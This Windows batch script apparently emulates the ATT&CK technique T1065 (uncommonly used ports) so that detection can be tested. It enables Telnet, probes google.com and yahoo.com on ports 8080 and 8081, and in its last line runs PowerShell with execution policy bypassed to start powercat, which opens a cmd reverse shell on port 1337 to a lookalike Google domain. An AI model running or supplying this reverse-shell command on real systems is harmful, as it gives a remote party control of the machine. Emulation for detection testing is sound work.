@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Uncommonly Used Port	(T1065)
ECHO.
ECHO [*] Enabling Telnet...
cmd /c dism /online /Enable-Feature /FeatureName:TelnetClient 2>nul
ECHO.
ECHO [+] Connecting to External Soruces on 8080,8081,1337
cmd /c telnet google.com 8081
ECHO.
cmd /c %UTILITIES%PortQry -n yahoo.com -e 8080
ECHO.
ECHO.
ECHO [+] Executing via Powershell command and nc.ps1
powershell "test-netconnection -ComputerName 'google.com' -port 8081"
powershell -Exec Bypass ". \"%PAYLOAD%\T1065\nc.ps1\";powercat -c www.googleaccountsservices.com -p 1337 -t 2 -e cmd"
ECHO.
